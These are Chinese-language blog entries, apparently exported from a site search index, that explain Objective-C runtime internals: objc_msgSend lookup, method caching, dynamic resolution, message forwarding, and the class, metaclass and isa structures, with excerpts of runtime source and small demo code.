UNWIND _objc_msgSend, NoFrame cmp p0, #0 // nil check and tagged pointer check #if SUPPORT_TAGGED_POINTERS b.le LNilOrTagged // (MSB tagged pointer looks negative) #else b.eq LReturnZero #endif ldr p13, [x0] // p13 = isa GetClassFromIsa_p16 p13, 1, x0 // p16 = class LGetIsaDone: // calls imp or objc_msgSend_uncached CacheLookup NORMAL, _objc_msgSend, __objc_msgSend_uncached #if SUPPORT_TAGGED_POINTERS LNilOrTagged: b.eq LReturnZero // nil check GetTaggedClass b LGetIsaDone // SUPPORT_TAGGED_POINTERS #endif LReturnZero: // x0 is already zero mov x1, #0 movi d0, #0 movi d1, #0 movi d2, #0 movi d3, #0 ret END_ENTRY _objc_msgSend 根据汇编和注释，理出其核心伪代码为： id objc_msgSend(id receiver, SEL selector, ...) { if (receiver == nil) return nil; Class cls = receiver-\u003egetIsa(); // 1 imp = CacheLookup(receiver, selector); // 2 if (imp) return imp; // __objc_msgSend_uncached -\u003e MethodTableLookup -\u003e _lookUpImpOrForward imp = lookUpImpOrForward(receiver, selector, cls); // 3 return imp; } ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:0:0","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"1. 获取isa ldr p13, [x0] // p13 = isa GetClassFromIsa_p16 p13, 1, x0 // p16 = class ==\u003e Class cls = receiver-\u003egetIsa(); GetClassFromIsa_p16 汇编代码： .macro GetClassFromIsa_p16 src, needs_auth, auth_address /* note: auth_address is not required if !needs_auth */ #if SUPPORT_INDEXED_ISA // Indexed isa mov p16, \\src // optimistically set dst = src tbz p16, #ISA_INDEX_IS_NPI_BIT, 1f // done if not non-pointer isa // isa in p16 is indexed adrp x10, _objc_indexed_classes@PAGE add x10, x10, _objc_indexed_classes@PAGEOFF ubfx p16, p16, #ISA_INDEX_SHIFT, #ISA_INDEX_BITS // extract index ldr p16, [x10, p16, UXTP #PTRSHIFT] // load class from array 1: #elif __LP64__ .if \\needs_auth == 0 // _cache_getImp takes an authed class already mov p16, \\src .else // 64-bit packed isa ExtractISA p16, \\src, \\auth_address .endif #else // 32-bit raw isa mov p16, \\src #endif .endmacro C语言实现版本为 getIsa inline Class objc_object::getIsa() { if (fastpath(!isTaggedPointer())) return ISA(); extern objc_class OBJC_CLASS_$___NSUnrecognizedTaggedPointer; uintptr_t slot, ptr = (uintptr_t)this; Class cls; slot = (ptr \u003e\u003e _OBJC_TAG_SLOT_SHIFT) \u0026 _OBJC_TAG_SLOT_MASK; cls = objc_tag_classes[slot]; if (slowpath(cls == (Class)\u0026OBJC_CLASS_$___NSUnrecognizedTaggedPointer)) { slot = (ptr \u003e\u003e _OBJC_TAG_EXT_SLOT_SHIFT) \u0026 _OBJC_TAG_EXT_SLOT_MASK; cls = objc_tag_ext_classes[slot]; } return cls; } ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:1:0","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"2. 缓存查找 CacheLookup NORMAL ==\u003e imp = CacheLookup(receiver, selector); CacheLookup 包含三种模式 NORMAL / LOOKUP / GETIMP 其具体汇编逻辑就是在 objc_class 类结构体中获取 cache_t 的 buckets，循环比较要查找的方法名是否在缓存列表 buckets 中，找到返回 imp，没有找到则调用 __objc_msgSend_uncached（具体数据结构在OC方法\u0026OC类\u0026OC对象中查看） STATIC_ENTRY __objc_msgSend_uncached UNWIND __objc_msgSend_uncached, FrameWithNoSaves // THIS IS NOT A CALLABLE C FUNCTION // Out-of-band p15 is the class to search MethodTableLookup TailCallFunctionPointer x17 END_ENTRY __objc_msgSend_uncached MethodTableLookup： .macro MethodTableLookup SAVE_REGS MSGSEND // lookUpImpOrForward(obj, sel, cls, LOOKUP_INITIALIZE | LOOKUP_RESOLVER) // receiver and selector already in x0 and x1 mov x2, x16 mov x3, #3 bl _lookUpImpOrForward // IMP in x0 mov x17, x0 RESTORE_REGS MSGSEND .endmacro ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:2:0","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3. 方法查找流程 而 lookUpImpOrForward 使用C函数实现： NEVER_INLINE IMP lookUpImpOrForward(id inst, SEL sel, Class cls, int behavior) { const IMP forward_imp = (IMP)_objc_msgForward_impcache; IMP imp = nil; Class curClass; runtimeLock.assertUnlocked(); if (slowpath(!cls-\u003eisInitialized())) { // The first message sent to a class is often +new or +alloc, or +self // which goes through objc_opt_* or various optimized entry points. // // However, the class isn't realized/initialized yet at this point, // and the optimized entry points fall down through objc_msgSend, // which ends up here. // // We really want to avoid caching these, as it can cause IMP caches // to be made with a single entry forever. // // Note that this check is racy as several threads might try to // message a given class for the first time at the same time, // in which case we might cache anyway. behavior |= LOOKUP_NOCACHE; } // runtimeLock is held during isRealized and isInitialized checking // to prevent races against concurrent realization. // runtimeLock is held during method search to make // method-lookup + cache-fill atomic with respect to method addition. // Otherwise, a category could be added but ignored indefinitely because // the cache was re-filled with the old value after the cache flush on // behalf of the category. runtimeLock.lock(); // We don't want people to be able to craft a binary blob that looks like // a class but really isn't one and do a CFI attack. // // To make these harder we want to make sure this is a class that was // either built into the binary or legitimately registered through // objc_duplicateClass, objc_initializeClassPair or objc_allocateClassPair. checkIsKnownClass(cls); cls = realizeAndInitializeIfNeeded_locked(inst, cls, behavior \u0026 LOOKUP_INITIALIZE); // runtimeLock may have been dropped but is now locked again runtimeLock.assertLocked(); curClass = cls; // The code used to lookup the class's cache again right after // we take the lock but for the vast majority of the cases // evidence shows this is a miss most of the time, hence a time loss. // // The only codepath calling into this without having performed some // kind of cache lookup is class_getInstanceMethod(). for (unsigned attempts = unreasonableClassCount();;) { if (curClass-\u003ecache.isConstantOptimizedCache(/* strict */true)) { #if CONFIG_USE_PREOPT_CACHES imp = cache_getImp(curClass, sel); if (imp) goto done_unlock; curClass = curClass-\u003ecache.preoptFallbackClass(); #endif } else { // curClass method list. Method meth = getMethodNoSuper_nolock(curClass, sel); if (meth) { imp = meth-\u003eimp(false); goto done; } if (slowpath((curClass = curClass-\u003egetSuperclass()) == nil)) { // No implementation found, and method resolver didn't help. // Use forwarding. imp = forward_imp; break; } } // Halt if there is a cycle in the superclass chain. if (slowpath(--attempts == 0)) { _objc_fatal(\"Memory corruption in class list.\"); } // Superclass cache. imp = cache_getImp(curClass, sel); if (slowpath(imp == forward_imp)) { // Found a forward:: entry in a superclass. // Stop searching, but don't cache yet; call method // resolver for this class first. break; } if (fastpath(imp)) { // Found the method in a superclass. Cache it in this class. goto done; } } // No implementation found. Try method resolver once. if (slowpath(behavior \u0026 LOOKUP_RESOLVER)) { behavior ^= LOOKUP_RESOLVER; return resolveMethod_locked(inst, sel, cls, behavior); } done: if (fastpath((behavior \u0026 LOOKUP_NOCACHE) == 0)) { #if CONFIG_USE_PREOPT_CACHES while (cls-\u003ecache.isConstantOptimizedCache(/* strict */true)) { cls = cls-\u003ecache.preoptFallbackClass(); } #endif log_and_fill_cache(cls, imp, sel, inst, curClass); } done_unlock: runtimeLock.unlock(); if (slowpath((behavior \u0026 LOOKUP_NIL) \u0026\u0026 imp == forward_imp)) { return nil; } return imp; } 这是 objc-runtime-new.mm 中源码，其实可以结合 objc-runtime-old.mm 能更清晰的理出其逻辑： 初始化 本类缓存查找 找到返回 IMP 本类方法列表查找 找到返回 IMP 循环父类链在父类缓存和方法列表查找 找到记录进缓存 获取 IMP返回 动态方法解析 实例方法解析 类方法解析 重新进行一边方法查找流程 消息转发 ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:0","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.1 查找本类 // 查找本类缓存 if (curClass-\u003ecache.isConstantOptimizedCache(/* strict */true)) { imp = cache_getImp(curClass, sel); if (imp) goto done_unlock; ... #endif } else { // 查找本类方法列表 // curClass method list. Method meth = getMethodNoSuper_nolock(curClass, sel); if (meth) { imp = meth-\u003eimp(false); goto done; } ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:1","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.2 查找父类 // Superclass cache. imp = cache_getImp(curClass, sel); if (slowpath(imp == forward_imp)) { // Found a forward:: entry in a superclass. // Stop searching, but don't cache yet; call method // resolver for this class first. break; } if (fastpath(imp)) { // Found the method in a superclass. Cache it in this class. goto done; } 其中 slowpath 和 fastpath 是两个宏定义，其主要作用是告诉编译 if 中是大概率还是小概率事件从而优化代码 // x 大概率是1 #define fastpath(x) (__builtin_expect(bool(x), 1)) // x 大概率是0 #define slowpath(x) (__builtin_expect(bool(x), 0)) 所以 slowpath(imp == forward_imp) 就是大概率 imp 不等于 forward_imp fastpath(imp) 是 imp 大概率存在 ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:2","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.3 动态方法解析 // No implementation found. Try method resolver once. if (slowpath(behavior \u0026 LOOKUP_RESOLVER)) { behavior ^= LOOKUP_RESOLVER; return resolveMethod_locked(inst, sel, cls, behavior); } static NEVER_INLINE IMP resolveMethod_locked(id inst, SEL sel, Class cls, int behavior) { ... if (! cls-\u003eisMetaClass()) { // try [cls resolveInstanceMethod:sel] resolveInstanceMethod(inst, sel, cls); } else { // try [nonMetaClass resolveClassMethod:sel] // and [cls resolveInstanceMethod:sel] resolveClassMethod(inst, sel, cls); if (!lookUpImpOrNilTryCache(inst, sel, cls)) { resolveInstanceMethod(inst, sel, cls); } } ... } resolveMethod_locked 的逻辑是如果本类是元类，调用 resolveInstanceMethod；如果不是说明方法是实例方法，调用 resolveClassMethod。 static void resolveInstanceMethod(id inst, SEL sel, Class cls) { ... SEL resolve_sel = @selector(resolveInstanceMethod:); BOOL (*msg)(Class, SEL, SEL) = (typeof(msg))objc_msgSend; bool resolved = msg(cls, resolve_sel, sel); // Cache the result (good or bad) so the resolver doesn't fire next time. // +resolveInstanceMethod adds to self a.k.a. cls IMP imp = lookUpImpOrNilTryCache(inst, sel, cls); ... } 发送调用 resolveInstanceMethod: 解析器方法（在 NSObjcet 中已实现），该解析器方法动态为实例方法的 SEL 提供 IMP，如果找到方法并添加到 receiver 中返回 true。解析成功需要重新进行方法查找以保障返回 IMP。 ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:3","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.4 重新执行查找流程 static NEVER_INLINE IMP resolveMethod_locked(id inst, SEL sel, Class cls, int behavior) { ... // chances are that calling the resolver have populated the cache // so attempt using it return lookUpImpOrForwardTryCache(inst, sel, cls, behavior); } IMP lookUpImpOrForwardTryCache(id inst, SEL sel, Class cls, int behavior) { return _lookUpImpTryCache(inst, sel, cls, behavior); } static IMP _lookUpImpTryCache(id inst, SEL sel, Class cls, int behavior) { ... if (slowpath(imp == NULL)) { return lookUpImpOrForward(inst, sel, cls, behavior); } ... } 最终会再执行 lookUpImpOrForward 重走查找流程。 ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:4","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"3.5 消息转发 如果以上流程都没有找到方法 IMP，则进入消息转发流程，这个流程又进入到汇编代码中 const IMP forward_imp = (IMP)_objc_msgForward_impcache; // No implementation found, and method resolver didn't help. // Use forwarding. imp = forward_imp; ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:3:5","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"4. 消息转发分析 /******************************************************************** * * id _objc_msgForward(id self, SEL _cmd,...); * * _objc_msgForward is the externally-callable * function returned by things like method_getImplementation(). * _objc_msgForward_impcache is the function pointer actually stored in * method caches. * ********************************************************************/ STATIC_ENTRY __objc_msgForward_impcache // No stret specialization. b __objc_msgForward END_ENTRY __objc_msgForward_impcache ENTRY __objc_msgForward adrp x17, __objc_forward_handler@PAGE ldr p17, [x17, __objc_forward_handler@PAGEOFF] TailCallFunctionPointer x17 END_ENTRY __objc_msgForward void *_objc_forward_handler = (void*)objc_defaultForwardHandler; 这里其实跟不下去了，查阅资料发现这里有个小技巧，可以通过 instrumentObjcMessageSends 打开 log，并且会保存在 /tmp/msgSends-%d 路径文件中，我们在 Demo 中添加代码： 查看日志文件： Student Student resolveInstanceMethod: Student Student resolveInstanceMethod: Student NSObject forwardingTargetForSelector: Student NSObject forwardingTargetForSelector: Student Student methodSignatureForSelector: Student Student methodSignatureForSelector: ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:4:0","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"4.1 forwardingTargetForSelector + (id)forwardingTargetForSelector:(SEL)sel { return nil; } - (id)forwardingTargetForSelector:(SEL)sel { return nil; } 我们看下官方接口描述： If an object implements (or inherits) this method, and returns a non-nil (and non-self) result, that returned object is used as the new receiver object and the message dispatch resumes to that new object. (Obviously if you return self from this method, the code would just fall into an infinite loop.) If you implement this method in a non-root class, if your class has nothing to return for the given selector then you should return the result of invoking super’s implementation. This method gives an object a chance to redirect an unknown message sent to it before the much more expensive forwardInvocation: machinery takes over. This is useful when you simply want to redirect messages to another object and can be an order of magnitude faster than regular forwarding. It is not useful where the goal of the forwarding is to capture the NSInvocation, or manipulate the arguments or return value during the forwarding. “当您只想将消息重定向到另一个对象，并且比常规转发快一个数量级时，此功能很有用” 来研究下如何使用，我们创建一个 Teacher 类，但不继承 Person，那我们想让 Teacher 调用 Person 的 sleep 方法，通过快速转发应该如何实现： // Teacher.m @implementation Teacher - (void)teach { NSLog(@\"I am teaching\"); } - (id)forwardingTargetForSelector:(SEL)aSelector { NSLog(@\"%s\", __func__); Person *p = [[Person alloc] init]; if ([p respondsToSelector: aSelector]) { return p; } return [super forwardingTargetForSelector: aSelector]; } @end // main.m 中即可实现 Teacher 调用 sleep Teacher *t = [[Teacher alloc] init]; [t performSelector:@selector(sleep)]; ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:4:1","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"4.2 methodSignatureForSelector 也没有具体实现，同样看下文档 This method is used in the implementation of protocols. This method is also used in situations where an NSInvocation object must be created, such as during message forwarding. If your object maintains a delegate or is capable of handling messages that it does not directly implement, you should override this method to return an appropriate method signature. “用于 NSInvocation 必须创建对象的情况下，例如在消息转发期间” 接着会调用 forwardInvocation: 方法进行消息转发。 同样，我们想实现 forwardingTargetForSelector 中展示的那种能力，看看利用 methodSignatureForSelector + forwardInvocation 如何code. 我们继续在 Teacher 类中施加魔法： // Teacher.m @implementation Teacher - (NSMethodSignature *)methodSignatureForSelector:(SEL)aSelector { NSLog(@\"%s\", __func__); if (aSelector == @selector(walk)) { // 获取 SEL 方法签名 NSMethodSignature *sig = [[Person new] methodSignatureForSelector:aSelector]; return sig; } return [super methodSignatureForSelector:aSelector]; } - (void)forwardInvocation:(NSInvocation *)anInvocation { NSLog(@\"%@\", anInvocation); // 获取 SEL 消息 SEL s = [anInvocation selector]; // 实例化 Person 类 Person *p = [[Person alloc] init]; // 向接收对象 p 发送 SEL 消息 if ([p respondsToSelector:s]) { [anInvocation invokeWithTarget:p]; } else { [super forwardInvocation:anInvocation]; } } @end // main.m 中实现 Teacher 调用 walk // methodSignatureForSelector + forwardInvocation [t performSelector:@selector(walk)]; Warning 请注释掉4.1中的 - (id)forwardingTargetForSelector:(SEL)aSelector 实现，否则会优先执行快速转发机制而不会走到 methodSignatureForSelector 中。 这个消息转发原理我们后续会在一些经典的 AOP 框架分析中看到其利用。 ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:4:2","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":"总结 整个流程包括 缓存查找 -\u003e 本类父类方法查找 -\u003e 动态方法解析 -\u003e 快速消息转发 -\u003e 慢速消息转发。而其中动态方法解析、快速消息转发和慢速消息转发就是 🍎 给的额外三次寻找 IMP 的机会。 至此 obj_msgSend 的整个流程梳理完毕，其中很多细节建议读者自己去阅读探寻。 ","date":"2021-03-15","objectID":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html:5:0","tags":["iOS","AOP"],"title":"方法查找和消息转发","uri":"/posts/%E6%96%B9%E6%B3%95%E6%9F%A5%E6%89%BE%E5%92%8C%E6%B6%88%E6%81%AF%E8%BD%AC%E5%8F%91.html"},{"categories":["iOS"],"content":" iOS AOP文章系列 前导知识： Mach-O文件结构分析 静态链接\u0026动态链接 OC方法\u0026OC类\u0026OC对象 方法查找和消息转发 AOP框架： Method Swizzling Fishhook Apsects NSProxy AOP Tip 源码分析环境：objc4-818.2 ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:0:0","tags":["iOS","AOP"],"title":"OC方法\u0026OC类\u0026OC对象","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"OC方法 通过之前的文章 Mach-O文件结构分析 我们得知OC方法在编译时调用了 objc_msgSend 函数 int main(int argc, const char * argv[]) { @autoreleasepool { // insert code here... NSLog(@\"Hello, World!\"); Person *p = [[Person alloc] init]; [p walk]; [p ill]; [p sleep]; run(); } return 0; } clang -rewrite-objc main.m -o main.cpp int main(int argc, const char * argv[]) { /* @autoreleasepool */ { __AtAutoreleasePool __autoreleasepool; NSLog((NSString *)\u0026__NSConstantStringImpl__var_folders_16_fnqk_6_50_z264j18b83nb9w0000gp_T_main_c8b264_mi_1); Person *p = ((Person *(*)(id, SEL))(void *)objc_msgSend)((id)((Person *(*)(id, SEL))(void *)objc_msgSend)((id)objc_getClass(\"Person\"), sel_registerName(\"alloc\")), sel_registerName(\"init\")); ((void (*)(id, SEL))(void *)objc_msgSend)((id)p, sel_registerName(\"walk\")); ((void (*)(id, SEL))(void *)objc_msgSend)((id)p, sel_registerName(\"ill\")); ((void (*)(id, SEL))(void *)objc_msgSend)((id)p, sel_registerName(\"sleep\")); run(); } return 0; } obj_msgSend 函数有两个参数 id、SEL，id 是操作对象，SEL 则通过消息发送机制查找对应 imp。 因此OC方法本质就是调用 obj_msgSend 函数。 关于 obj_msgSend 的消息查找和消息发送在后续文章中详细介绍。 ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:1:0","tags":["iOS","AOP"],"title":"OC方法\u0026OC类\u0026OC对象","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"OC类/OC对象 Person *p = [[Person alloc] init]; 我们在 main.cpp 文件以及源码中看下 Person 类（class）和 p 对象（id）的结构体 // main.cpp struct Person_IMPL { struct NSObject_IMPL NSObject_IVARS; }; struct NSObject_IMPL { Class isa; }; typedef struct objc_class *Class; typedef struct objc_object *id; // objc-runtime-new.h struct objc_class : objc_object { // Class ISA; Class superclass; cache_t cache; // formerly cache pointer and vtable class_data_bits_t bits; // class_rw_t * plus custom rr/alloc flags class_rw_t *data() const { return bits.data(); } ... } // objc-private.h struct objc_object { private: isa_t isa; public: // ISA() assumes this is NOT a tagged pointer object Class ISA(bool authenticated = false); // rawISA() assumes this is NOT a tagged pointer object or a non pointer ISA Class rawISA(); // getIsa() allows this to be a tagged pointer object Class getIsa(); ... } Person 类是一个 objc_class 结构体，而 objc_class 继承自 objc_object，说明类本身也是一个对象，称之为类对象。 类包含: isa // 为了内存优化，设计成 isa_t 结构体，指向元类 superclass // 父类指针 cache // 该类的方法缓存 bits // 该类的具体信息 data // 存放类的方法、属性、协议等信息 首先看下 cache_t 结构体，主要作为存储方法缓存，具体原理我们在方法缓存查找文章中讲解： struct cache_t { ... public: mask_t mask() const; // 缓存数组的容量临界值 struct bucket_t *buckets() const; // 方法缓存数组 Class cls() const; mask_t occupied() const; // 缓存数组中已缓存方法数量 ... } struct bucket_t { private: #if __arm64__ explicit_atomic\u003cuintptr_t\u003e _imp; explicit_atomic\u003cSEL\u003e _sel; #else explicit_atomic\u003cSEL\u003e _sel; explicit_atomic\u003cuintptr_t\u003e _imp; #endif ... } 再看下 class_data_bits_t 结构体： struct class_data_bits_t { friend objc_class; // Values are the FAST_ flags above. uintptr_t bits; ... public: class_rw_t* data() const { return (class_rw_t *)(bits \u0026 FAST_DATA_MASK); } ... } struct class_rw_t { // Be warned that Symbolication knows the layout of this structure. uint32_t flags; uint16_t witness; #if SUPPORT_INDEXED_ISA uint16_t index; #endif explicit_atomic\u003cuintptr_t\u003e ro_or_rw_ext; Class firstSubclass; Class nextSiblingClass; ... public: ... const method_array_t methods() const { auto v = get_ro_or_rwe(); if (v.is\u003cclass_rw_ext_t *\u003e()) { return v.get\u003cclass_rw_ext_t *\u003e(\u0026ro_or_rw_ext)-\u003emethods; } else { return method_array_t{v.get\u003cconst class_ro_t *\u003e(\u0026ro_or_rw_ext)-\u003ebaseMethods()}; } } const property_array_t properties() const { auto v = get_ro_or_rwe(); if (v.is\u003cclass_rw_ext_t *\u003e()) { return v.get\u003cclass_rw_ext_t *\u003e(\u0026ro_or_rw_ext)-\u003eproperties; } else { return property_array_t{v.get\u003cconst class_ro_t *\u003e(\u0026ro_or_rw_ext)-\u003ebaseProperties}; } } const protocol_array_t protocols() const { auto v = get_ro_or_rwe(); if (v.is\u003cclass_rw_ext_t *\u003e()) { return v.get\u003cclass_rw_ext_t *\u003e(\u0026ro_or_rw_ext)-\u003eprotocols; } else { return protocol_array_t{v.get\u003cconst class_ro_t *\u003e(\u0026ro_or_rw_ext)-\u003ebaseProtocols}; } } }; 其中即存放着方法列表、属性列表、协议列表等 Warning 需要注意类存放对象方法，元类存放类方法 现在我们回头看下Mach-O文件结构分析中介绍的 Section64(__DATA,__objc_data) 分布，存储的是 objc_calss 类结构，是不是一目了然： 而存储与Section64(__DATA,__objc_const) 的 class_rw_t 结构体分布也得以验证。 ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:2:0","tags":["iOS","AOP"],"title":"OC方法\u0026OC类\u0026OC对象","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"元类（metaclass） 既然类也是一个对象，那么它一定是其他类的实例，那个类就是元类 (metaclass)。元类是类（对象）的描述，就像类是普通实例的描述一样。特别的是，元类的方法列表是类方法。当你发送消息给一个类，objc_msgSend 会查找元类（已及它的父类）的方法列表并确定调用的方法。 可以从创建类的过程来了解下元类，我们为 Person 添加一个子类 Student： void StudyFunction(id self, SEL _cmd) { NSLog(@\"i am studing\"); } int main(int argc, const char * argv[]) { @autoreleasepool { Person *p = [[Person alloc] init]; p.age = 26; [p walk]; [p sleep]; run(); // 为class pair分配内存 Class newClass = objc_allocateClassPair([Person class], \"Student\", 0); // 为新类添加方法 class_addMethod(newClass, @selector(study), (IMP)StudyFunction, \"v@:\"); // 注册类 objc_registerClassPair(newClass); // 初始化实例对象 id s = [[newClass alloc] init]; // 调用本类 study 方法 [s performSelector:@selector(study)]; // 调用父类 sleep 方法 [s sleep]; } return 0; } Student 实例对象调用 Person 类方法，会查找自己的类和父类的方法列表： 我们看一下 objc_allocateClassPair 源码： Class objc_initializeClassPair(Class superclass, const char *name, Class cls, Class meta) { // Fail if the class name is in use. if (look_up_class(name, NO, NO)) return nil; mutex_locker_t lock(runtimeLock); // Fail if the class name is in use. // Fail if the superclass isn't kosher. if (getClassExceptSomeSwift(name) || !verifySuperclass(superclass, true/*rootOK*/)) { return nil; } objc_initializeClassPair_internal(superclass, name, cls, meta); return cls; } static void objc_initializeClassPair_internal(Class superclass, const char *name, Class cls, Class meta) { ... class_ro_t *cls_ro_w, *meta_ro_w; class_rw_t *cls_rw_w, *meta_rw_w; cls_rw_w = objc::zalloc\u003cclass_rw_t\u003e(); meta_rw_w = objc::zalloc\u003cclass_rw_t\u003e(); cls_ro_w = (class_ro_t *)calloc(sizeof(class_ro_t), 1); meta_ro_w = (class_ro_t *)calloc(sizeof(class_ro_t), 1); ... // Set basic info ... // Connect to superclasses and metaclasses cls-\u003einitClassIsa(meta); // 0 if (superclass) { meta-\u003einitClassIsa(superclass-\u003eISA()-\u003eISA()); // 1 cls-\u003esetSuperclass(superclass); // 2 meta-\u003esetSuperclass(superclass-\u003eISA()); // 3 addSubclass(superclass, cls); // 4 addSubclass(superclass-\u003eISA(), meta); // 5 } else { meta-\u003einitClassIsa(meta); cls-\u003esetSuperclass(Nil); meta-\u003esetSuperclass(cls); addRootClass(cls); addSubclass(cls, meta); } addClassTableEntry(cls); } 在 objc_initializeClassPair_internal 中分配了 class_ro_t / class_rw_t 类结构体，设置类 flag 等类基础信息，最后实现类 superclass 和 isa 的指向。可以用下图来展示链接过程： ","date":"2021-03-10","objectID":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html:3:0","tags":["iOS","AOP"],"title":"OC方法\u0026OC类\u0026OC对象","uri":"/posts/oc%E6%96%B9%E6%B3%95oc%E7%B1%BBoc%E5%AF%B9%E8%B1%A1.html"},{"categories":["iOS"],"content":"isa指针 通过前面分析，每一个对象都以一个 isa 指针，实际上 isa 就是将对象 , 类 , 以及元类连接起来，在实例对象中指向类对象，类对象的 isa 指向元类，元类的 isa 指向根元类，根元类指向自己。 至于 isa 的优化不做过多介绍，读者可自行查阅学习。 